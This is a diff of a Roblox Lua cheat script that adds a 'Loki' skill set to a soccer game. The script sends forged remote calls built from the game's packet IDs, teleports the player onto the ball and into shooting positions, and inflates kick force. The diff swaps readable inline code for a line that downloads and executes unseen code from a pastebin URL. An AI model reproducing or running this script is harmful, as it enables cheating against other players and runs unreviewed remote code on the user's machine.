@@ -1,48 +1,15 @@
-
-local plr = game.Players.LocalPlayer
+ local plr = game.Players.LocalPlayer
 local cam = game.Workspace.CurrentCamera
 
 local stopped = false
 local buffers = {}
 
-local HttpService = game:GetService("HttpService")
-local Lighting = game:GetService("Lighting")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-do
-	local networking = nil
-	local deadline = tick() + 15
-	repeat
-		local storage = ReplicatedStorage:FindFirstChild("BytenetStorage")
-		networking = storage and storage:FindFirstChild("Networking")
-		if not networking then task.wait(0.5) end
-	until networking or tick() > deadline
-	if networking then
-		local ok, parsed = pcall(function() return HttpService:JSONDecode(networking.Value) end)
-		if ok and parsed and parsed.packets then
-			for name, byteNum in pairs(parsed.packets) do
-				buffers[name] = string.char(byteNum)
-			end
-			if buffers["bytenet_use"] then
-				buffers["base"] = buffers["bytenet_use"] .. string.char(1) .. string.char(0)
-			end
-			if buffers["bytenet_findBall"] then
-				buffers["grabball"] = buffers["bytenet_findBall"]
-			end
-			local old = Lighting:FindFirstChild("BUFFERSTRINGS")
-			if old then old:Destroy() end
-			local folder = Instance.new("Folder")
-			folder.Name = "BUFFERSTRINGS"
-			folder.Parent = Lighting
-			for name, val in pairs(buffers) do
-				local sv = Instance.new("StringValue")
-				sv.Name = name
-				sv.Value = val
-				sv.Parent = folder
-			end
-		end
-	end
+loadstring(game:HttpGet("https://pastebin.com/raw/8XJh7dzh"))()
+repeat task.wait() until game.Lighting:FindFirstChild("BUFFERSTRINGS")
+for _, val in ipairs(game.Lighting:FindFirstChild("BUFFERSTRINGS"):GetChildren()) do
+    buffers[val.Name] = val.Value
 end
+game.Lighting:FindFirstChild("BUFFERSTRINGS"):Destroy()
 
 local link = "https://files.catbox.moe/u1yzdo.mp3"
 local filename = "lokiTheme.mp3"
@@ -64,6 +31,7 @@ local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local UserInputService = game:GetService("UserInputService")
 local Debris = game:GetService("Debris")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local SoundService = game:GetService("SoundService")
 local RunService = game:GetService("RunService")
 
@@ -120,7 +88,7 @@ local function TeleportShot(char, shootDelay)
     local root = char.HumanoidRootPart
     task.delay(shootDelay, function()
         if not char or not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Ball") then return end
-
+        
         local originalCFrame = root.CFrame
         local lookVector = root.CFrame.LookVector
         local team = char.state.team.Value
@@ -135,7 +103,7 @@ local function TeleportShot(char, shootDelay)
         end
         local gkCheck = workspace.map and workspace.map:FindFirstChild(oppositeTeam .. "GoalkeeperCheck")
         if gkCheck then table.insert(filterList, gkCheck) end
-
+        
         char:PivotTo(CFrame.new((function()
             local rayParams = RaycastParams.new()
             rayParams.FilterDescendantsInstances = filterList
@@ -145,11 +113,11 @@ local function TeleportShot(char, shootDelay)
         end)()))
         root.CFrame = root.CFrame * CFrame.Angles(0, math.pi, 0) * CFrame.new(0, 0, -8.823999)
         task.wait(0.2)
-
+        
         remote:FireServer(buffer.fromstring(buffers["base"]), {
-            {"kick", 29, false, root.CFrame.LookVector * 1e19, "basicShot"}
+            {"kick", 100, false, root.CFrame.LookVector * 1e19}
         })
-
+        
         task.wait(0.001)
         root.CFrame = originalCFrame
     end)
@@ -158,12 +126,12 @@ end
 local function Skill1(char)
     if IsMoveOnCD("skill1") then CancelMove() return end
     if not HasBall() then return CancelMove() end
-
+    
     CancelMove()
     DoCDVisual(8, "skill1")
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
-
+    
     local anim = Instance.new("Animation")
     anim.AnimationId = "rbxassetid://97586424269981"
     local humanoid = char:WaitForChild("Humanoid")
@@ -179,7 +147,7 @@ local function Skill1(char)
     task.delay(0.25, function()
         if not char or not char.Parent then return end
         replication.LokiKick(char)
-
+        
         local impactSound = Instance.new("Sound")
         impactSound.SoundId = "rbxassetid://118471535207840"
         impactSound.Volume = 2
@@ -187,77 +155,79 @@ local function Skill1(char)
         impactSound:Play()
         Debris:AddItem(impactSound, 2)
     end)
-
+    
     TeleportShot(char, 0.4)
-endlocal TooSlowActive = false
+end
+
+local TooSlowActive = false
 
 local function Skill2(char)
     if IsMoveOnCD("skill2") then CancelMove() return end
     if HasBall() then return CancelMove() end
     if Stunned() then return end
     if TooSlowActive then return end
-
+    
     local ball = Workspace.Terrain:FindFirstChild("Ball")
     if not ball then return end
-
+    
     CancelMove()
     DoCDVisual(10, "skill2")
     TooSlowActive = true
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
-
+    
     local grabbed = false
     local timeout = 0
-
+    
     while not grabbed and timeout < 60 do
         local currentBall = Workspace.Terrain:FindFirstChild("Ball")
         if not currentBall then
             TooSlowActive = false
             return
         end
-
+        
         local targetPos = currentBall.Position + Vector3.new(0, 2, 0)
         root.CFrame = CFrame.new(targetPos, targetPos + Vector3.new(0, 0, -1))
         root.AssemblyLinearVelocity = Vector3.zero
-
+        
         task.wait(0.05)
         remote:FireServer(buffer.fromstring(buffers["grabball"]))
         task.wait(0.05)
-
+        
         if HasBall() then
             grabbed = true
             break
         end
-
+        
         timeout = timeout + 1
     end
-
+    
     if not grabbed then
         TooSlowActive = false
         return
     end
-
+    
     local catchSound = Instance.new("Sound")
     catchSound.SoundId = "rbxassetid://129129031789518"
     catchSound.Volume = 1.5
     catchSound.Parent = root
     catchSound:Play()
     Debris:AddItem(catchSound, 2)
-
+    
     local anim = Instance.new("Animation")
     anim.AnimationId = "rbxassetid://82371642989185"
     local humanoid = char:WaitForChild("Humanoid")
     local animator = humanoid:FindFirstChildOfClass("Animator")
-    if not animator then
+    if not animator then          
         animator = Instance.new("Animator")
         animator.Parent = humanoid
     end
     local track = animator:LoadAnimation(anim)
     track.Priority = Enum.AnimationPriority.Action4
     track:Play()
-
+    
     replication.lokicatch(char)
-
+    
     TooSlowActive = false
 end
 
@@ -265,29 +235,29 @@ local Skill3Active = false
 
 local function Skill3(char)
     if stopped or Skill3Active or IsMoveOnCD("skill3") or Stunned() then return end
-
+    
     CancelMove()
     DoCDVisual(0.1, "skill3")
     Skill3Active = true
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
-
+    
     local dashSound = Instance.new("Sound")
     dashSound.SoundId = "rbxassetid://120170187802322"
     dashSound.Volume = 1.5
     dashSound.Parent = root
     dashSound:Play()
     Debris:AddItem(dashSound, 3)
-
+    
     local direction = root.CFrame.LookVector
     root.AssemblyLinearVelocity = direction * 150
-
+    
     task.delay(0.3, function()
         root.AssemblyLinearVelocity = Vector3.zero
     end)
-
+    
     replication.LokiDashSuper(char)
-
+    
     Skill3Active = false
 end
 
@@ -295,19 +265,19 @@ local function Skill4(char)
     if IsMoveOnCD("skill4") then CancelMove() return end
     if not HasBall() then return CancelMove() end
     if Stunned() then return end
-
+    
     CancelMove()
     DoCDVisual(15, "skill4")
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
-
+    
     local kickSound = Instance.new("Sound")
     kickSound.SoundId = "rbxassetid://129129031789518"
     kickSound.Volume = 1.5
     kickSound.Parent = root
     kickSound:Play()
     Debris:AddItem(kickSound, 2)
-
+    
     local anim = Instance.new("Animation")
     anim.AnimationId = "rbxassetid://115839777221212"
     local humanoid = char:WaitForChild("Humanoid")
@@ -323,7 +293,7 @@ local function Skill4(char)
     task.delay(0.25, function()
         if not char or not char.Parent then return end
         replication.LokiKick(char)
-
+        
         local impactSound = Instance.new("Sound")
         impactSound.SoundId = "rbxassetid://118471535207840"
         impactSound.Volume = 2
@@ -331,7 +301,7 @@ local function Skill4(char)
         impactSound:Play()
         Debris:AddItem(impactSound, 2)
     end)
-
+    
     TeleportShot(char, 0.4)
 end
 
@@ -339,86 +309,88 @@ local function Skill5(char)
     if IsMoveOnCD("skill5") then CancelMove() return end
     if HasBall() then return CancelMove() end
     if Stunned() then return end
-
+    
     local ball = Workspace.Terrain:FindFirstChild("Ball")
     if not ball then return end
-
+    
     CancelMove()
     DoCDVisual(12, "skill5")
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
-
+    
     local grabbed = false
     local timeout = 0
-
+    
     while not grabbed and timeout < 60 do
         local currentBall = Workspace.Terrain:FindFirstChild("Ball")
         if not currentBall then
             return
         end
-
+        
         local targetPos = currentBall.Position + Vector3.new(0, 2, 0)
         root.CFrame = CFrame.new(targetPos, targetPos + Vector3.new(0, 0, -1))
         root.AssemblyLinearVelocity = Vector3.zero
-
+        
         task.wait(0.05)
         remote:FireServer(buffer.fromstring(buffers["grabball"]))
         task.wait(0.05)
-
+        
         if HasBall() then
             grabbed = true
             break
         end
-
+        
         timeout = timeout + 1
     end
-
+    
     if not grabbed then
         return
     end
-
+    
     local catchSound = Instance.new("Sound")
     catchSound.SoundId = "rbxassetid://129129031789518"
     catchSound.Volume = 1.5
     catchSound.Parent = root
     catchSound:Play()
     Debris:AddItem(catchSound, 2)
-
+    
     local anim = Instance.new("Animation")
     anim.AnimationId = "rbxassetid://82371642989185"
     local humanoid = char:WaitForChild("Humanoid")
     local animator = humanoid:FindFirstChildOfClass("Animator")
-    if not animator then
+    if not animator then          
         animator = Instance.new("Animator")
         animator.Parent = humanoid
     end
     local track = animator:LoadAnimation(anim)
     track.Priority = Enum.AnimationPriority.Action4
     track:Play()
-
+    
     replication.lokicatch(char)
-endlocal lokiFlowOnCD = false
+end
+
+local lokiFlowOnCD = false
 local lokiFlowSound = nil
 
 local function LokiFlow(char)
     if Stunned() or lokiFlowOnCD then return end
     if HasBall() then return end
-
+    
     lokiFlowOnCD = true
-
+    
     local root = char:WaitForChild("HumanoidRootPart")
     local humanoid = char:WaitForChild("Humanoid")
-
+    
     plr:SetAttribute("style", "loki")
-
+    
     local originalSpeed = humanoid.WalkSpeed
     humanoid.WalkSpeed = 0
-
+    
     if lokiFlowSound and lokiFlowSound.IsPlaying then
         lokiFlowSound:Stop()
         lokiFlowSound:Destroy()
     end
-
+    
     lokiFlowSound = Instance.new("Sound")
     lokiFlowSound.SoundId = getasset(filename)
     lokiFlowSound.Volume = 3
@@ -426,11 +398,11 @@ local function LokiFlow(char)
     lokiFlowSound.MinDistance = 10
     lokiFlowSound.Parent = root
     lokiFlowSound:Play()
-
+    
     replication.LokiFlow(char)
-
+    
     remote:FireServer(buffer.fromstring(buffers["base"]), { { "tackle" } })
-
+    
     task.delay(8, function()
         char.state.stun.Value = false
         humanoid.WalkSpeed = originalSpeed or 40
@@ -442,7 +414,7 @@ local function SetUp(char)
     if stopped then return end
     repeat task.wait() until plr.Team ~= game.Teams.lobby
     task.wait(0.1)
-
+    
     local hotbar = plr.PlayerGui.Hotbar
     hotbar.Backpack.Hotbar.skill1.Base.MouseButton1Down:Connect(function()
         Skill1(plr.Character)
@@ -459,27 +431,27 @@ local function SetUp(char)
     hotbar.Backpack.Hotbar.skill5.Base.MouseButton1Down:Connect(function()
         Skill5(plr.Character)
     end)
-
+    
     hotbar.Backpack.Hotbar.skill1.Base.Reuse.Text = "Ball"
     hotbar.Backpack.Hotbar.skill2.Base.Reuse.Visible = true
     hotbar.Backpack.Hotbar.skill2.Base.Reuse.Text = "Trap"
     hotbar.Backpack.Hotbar.skill3.Base.Reuse.Text = "Movement"
     hotbar.Backpack.Hotbar.skill4.Base.Reuse.Text = "Ball"
     hotbar.Backpack.Hotbar.skill5.Base.Reuse.Text = "Trap"
-
+    
     hotbar.Backpack.Hotbar.skill4.Visible = true
     hotbar.Backpack.Hotbar.skill5.Visible = true
-
+    
     for i = 1, 5 do
         hotbar.Backpack.Hotbar["skill"..i].Base.Reuse.Visible = true
     end
-
+    
     hotbar.Backpack.Hotbar.skill1.Base.ToolName.Text = "Holding Back"
     hotbar.Backpack.Hotbar.skill2.Base.ToolName.Text = "Too Slow"
     hotbar.Backpack.Hotbar.skill3.Base.ToolName.Text = "Lightspeed Dash"
     hotbar.Backpack.Hotbar.skill4.Base.ToolName.Text = "Lightspeed Kick"
     hotbar.Backpack.Hotbar.skill5.Base.ToolName.Text = "Is this Okay?"
-
+    
     hotbar.MagicHealth.Awakening.Text = "God of Mischief"
     hotbar.MagicHealth.TextLabel.Visible = true
     hotbar.MagicHealth.TextLabel.Text = "Loki"
@@ -487,7 +459,7 @@ local function SetUp(char)
         ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 255)),
         ColorSequenceKeypoint.new(1, Color3.fromRGB(123, 50, 168))
     }
-
+    
     plr.Character:GetAttributeChangedSignal("FlowActive"):Connect(function()
         if plr.Character:GetAttribute("FlowActive") == true then
             if stopped then return end
@@ -505,62 +477,32 @@ plr.CharacterAdded:Connect(function(char)
     SetUp(char)
 end)
 
-local brandedGui = nil
+local soundReplacementActive = true
+local shot = "rbxassetid://118471535207840"
+local isag = {
+    ["rbxassetid://114952862979282"] = true
+}
 
-local function ApplyBranding()
-    local hotbar = plr.PlayerGui:WaitForChild("Hotbar", 30)
-    if not hotbar then return end
-    local backpack = hotbar:WaitForChild("Backpack", 30)
-    if not backpack then return end
-    local bar = backpack:WaitForChild("Hotbar", 30)
-    if not bar then return end
-
-    local labels = {
-        skill1 = "Shortcut",
-        skill2 = "Exterminate",
-        skill3 = "EXE Strike",
-        skill4 = "Altisimus",
-        skill5 = "whirlwind shot",
-    }
-    for slot, text in pairs(labels) do
-        local btn = bar:FindFirstChild(slot)
-        local toolName = btn and btn:FindFirstChild("Base") and btn.Base:FindFirstChild("ToolName")
-        if toolName then toolName.Text = text end
-    end
-
-    local magic = hotbar:WaitForChild("MagicHealth", 30)
-    if not magic then return end
-    local awakening = magic:FindFirstChild("Awakening")
-    if awakening then awakening.Text = "FLOW" end
-    local textLabel = magic:FindFirstChild("TextLabel")
-    if textLabel then textLabel.Text = "Many Souls To Play With." end
-
-    if brandedGui ~= magic then
-        local health = magic:FindFirstChild("Health")
-        local frame = health and health:FindFirstChild("Frame")
-        local gradient = frame and frame:FindFirstChildOfClass("UIGradient")
-        if gradient then
-            gradient.Color = ColorSequence.new({
-                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-                ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 0, 0)),
-            })
-        end
-        brandedGui = magic
+local function replaceSound(sound)
+    if not sound:IsA("Sound") then return end
+    if not soundReplacementActive then return end
+    if isag[sound.SoundId] then
+        sound:Stop()
+        sound.SoundId = shot
+        sound:Play()
     end
 end
 
-task.spawn(function()
-    while not stopped do
-        pcall(ApplyBranding)
-        if stopped then break end
-        plr.CharacterAdded:Wait()
-        task.wait(1)
-    end
-end)
+for _, sound in ipairs(Workspace:GetDescendants()) do
+    replaceSound(sound)
+end
+
+local connection
+connection = Workspace.DescendantAdded:Connect(replaceSound)
 
 UserInputService.InputBegan:Connect(function(input, bg)
     if bg or stopped then return end
-
+    
     if input.KeyCode == Enum.KeyCode.One then
         Skill1(plr.Character)
     elseif input.KeyCode == Enum.KeyCode.Two then
